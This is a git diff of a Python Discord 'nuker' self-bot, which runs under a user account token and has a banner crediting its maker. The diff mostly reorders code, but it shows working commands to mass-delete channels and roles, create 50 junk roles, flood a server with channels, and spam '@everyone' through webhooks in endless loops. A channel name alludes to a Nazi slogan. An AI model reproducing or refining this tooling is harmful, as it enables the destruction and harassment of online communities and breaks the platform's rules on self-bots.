@@ -14,6 +14,9 @@ token = "" #token here
 
 prefix = "$"
 
+nuke1 = False
+
+
 spam = "@everyone"
 channel_name = 'heil-eitor'
 role_name = 'real'
@@ -40,9 +43,6 @@ def check():
 user = 'user'
 
 
-
-
-
 if user == check():
     try:
         real = commands.Bot(command_prefix=prefix, self_bot=True)
@@ -65,10 +65,6 @@ else:
         pass  
 
 
-def cdel1():
-    t = threading.Thread(target=chn1)
-    t.start()
-
 def chn1():
     try:
         r = requests.delete(f"https://discord.com/api/v9/channels/{chn_id}", headers=headers)
@@ -77,8 +73,6 @@ def chn1():
             time.sleep(n['retry_after'])
     except:
         pass
-
-nuke1 = False
 
 def channel1():
     payload = {
@@ -94,7 +88,26 @@ def channel1():
     except:
         pass
 
+    
+async def roles(ctx):
+    for i in range(50):
+        await ctx.guild.create_role(name=role_name)
 
+async def rdel(ctx):
+    for role in ctx.guild.roles:
+        await role.delete()
+    
+async def role():
+    try:
+        rdel()
+        roles()
+    except:
+        pass    
+
+def cdel1():
+    t = threading.Thread(target=chn1)
+    t.start()
+    
 def chnthread():
     global nuke1
     nuke1 = True
@@ -107,8 +120,9 @@ def chnthread1():
         t = threading.Thread(target=channel1)
         t.start()    
 
+        
 @real.command()
-async def info(ctx):
+async def serverinfo(ctx):
     try:
         await ctx.message.delete()
     except:
@@ -117,9 +131,6 @@ async def info(ctx):
         print(f"\n          there are :\n           {len(ctx.guild.channels)} Channels \n           {len(ctx.guild.roles)} Roles")
     except:
         pass
-
-
-
 
 @real.command()
 async def cdel(ctx):
@@ -131,9 +142,6 @@ async def cdel(ctx):
     for c in ctx.guild.channels:
         chn_id = c.id
         cdel1()
-
-
-
 
 @real.command()
 async def nuke(ctx):
@@ -157,17 +165,7 @@ async def nuke(ctx):
     except:
         pass
     await chnthread()
-    role()
-
-
-
-
-async def role():
-    try:
-        rdel()
-        roles()
-    except:
-        pass
+    await role()
 
 @real.command()
 async def cflood(ctx):
@@ -178,66 +176,6 @@ async def cflood(ctx):
     except:
         pass
     await chnthread1()
-
-async def roles(ctx):
-    for i in range(50):
-        await ctx.guild.create_role(name=role_name)
-
-async def rdel(ctx):
-    for role in ctx.guild.roles:
-        await role.delete()
-
-
-
-@real.event
-async def on_ready():
-    clear()
-    print(f"""\u001b[31;1m
-                                
-                                                                                .
-                                       .S_sSSb        sSSSSsSb      .S_SSSb    S.      
-                                      .SS~YS%%b      d%%SsSSSPL  ,sSS~SSSSSS  SS.     
-                                      S%S     `S%    d%S'       S%S     SSS  S%S     
-                                      S%S      S%    S%S        S%S     S%S  S%S     
-                                      S%S      ds    S&S        S%S%SSSSS%S  S&S      
-                                      S&S     .Ss    S&S_SSSSL  S&S  SSSS%S  S&S  \u001b[0m
-                                  \u001b[31;2m    S&S_sdSSS      S&S~SSSSP  S&S     S&S  S&S     
-                                      S&S~YSY%b      S&S        S&S     S&S  S&S     
-                                      S*S     `S%b   S*b        S*S     S&S  S*b
-                                      S*S      S%S   S*S.       S*S     S*S  S*S       
-                                      S*S      S&S    SSSbSsSsp S*S     S*S  S&S  \u001b[0m
-                                  \u001b[38;2;128;0;0m    S*S      SSS     YSSSSSP  SSS     S*S  S&SL 
-                                      SP       SSS                       SP   SSSbsSSSSP    
-                                     Y           I                       Y                \u001b[0m
-                                      
-                                              \u001b[31;1mMade by དΔØŜཌ eitor(real)#0368\u001b[0m
-                                              
-                                          \u001b[33;1mConnected in : [ {real.user.name}#{real.user.discriminator} ]\u001b[33;1m
-                                          
-                                          ID : [{real.user.id} ] {Fore.RESET}
-                                    
-                          \u001b[31;1m[============\u001b[0m\u001b[31;2m Type {prefix}cmds to get a list of the commands. {Fore.RESET}\u001b[31;1m============]\u001b[0m""") 
-                                
-
-@real.event
-async def on_command_error(ctx, a):
-    if isinstance(a, CommandNotFound):
-        try:
-            await ctx.message.delete()
-        except:
-            pass
-
-@real.event
-async def on_guild_channel_create(channel):
-    global nuke1
-    if nuke1 == True:
-        try:
-            webhook = await channel.create_webhook(name="real")
-            while True:
-                await webhook.send(spam)
-        except:
-            pass
-
 
 @real.command()
 async def rolescan(ctx):
@@ -252,7 +190,6 @@ async def rolescan(ctx):
     except:
         pass
     print("           ========================\n                    - P.S : The roles perms are in order.")
-
 
 @real.command()
 async def cmds(ctx):
@@ -291,7 +228,56 @@ async def hi(ctx):
     asyncio.sleep(3)
     await a.delete()
 
+@real.event
+async def on_ready():
+    clear()
+    print(f"""\u001b[31;1m
+                                
+                                                                                .
+                                       .S_sSSb        sSSSSsSb      .S_SSSb    S.      
+                                      .SS~YS%%b      d%%SsSSSPL  ,sSS~SSSSSS  SS.     
+                                      S%S     `S%    d%S'       S%S     SSS  S%S     
+                                      S%S      S%    S%S        S%S     S%S  S%S     
+                                      S%S      ds    S&S        S%S%SSSSS%S  S&S      
+                                      S&S     .Ss    S&S_SSSSL  S&S  SSSS%S  S&S  \u001b[0m
+                                  \u001b[31;2m    S&S_sdSSS      S&S~SSSSP  S&S     S&S  S&S     
+                                      S&S~YSY%b      S&S        S&S     S&S  S&S     
+                                      S*S     `S%b   S*b        S*S     S&S  S*b
+                                      S*S      S%S   S*S.       S*S     S*S  S*S       
+                                      S*S      S&S    SSSbSsSsp S*S     S*S  S&S  \u001b[0m
+                                  \u001b[38;2;128;0;0m    S*S      SSS     YSSSSSP  SSS     S*S  S&SL 
+                                      SP       SSS                       SP   SSSbsSSSSP    
+                                     Y           I                       Y                \u001b[0m
+                                      
+                                              \u001b[31;1mMade by དΔØŜཌ eitor(real)#0368\u001b[0m
+                                              
+                                          \u001b[33;1mConnected in : [ {real.user.name}#{real.user.discriminator} ]\u001b[33;1m
+                                          
+                                          ID : [{real.user.id} ] {Fore.RESET}
+                                    
+                          \u001b[31;1m[============\u001b[0m\u001b[31;2m Type {prefix}cmds to get a list of the commands. {Fore.RESET}\u001b[31;1m============]\u001b[0m""") 
+                                
+@real.event
+async def on_command_error(ctx, a):
+    if isinstance(a, CommandNotFound):
+        try:
+            await ctx.message.delete()
+        except:
+            pass
 
+@real.event
+async def on_guild_channel_create(channel):
+    global nuke1
+    if nuke1 == True:
+        try:
+            webhook = await channel.create_webhook(name="real")
+            while True:
+                await webhook.send(spam)
+        except:
+            pass
+
+
+        
 if user == check():
     try:
         real.run(token, bot=False)
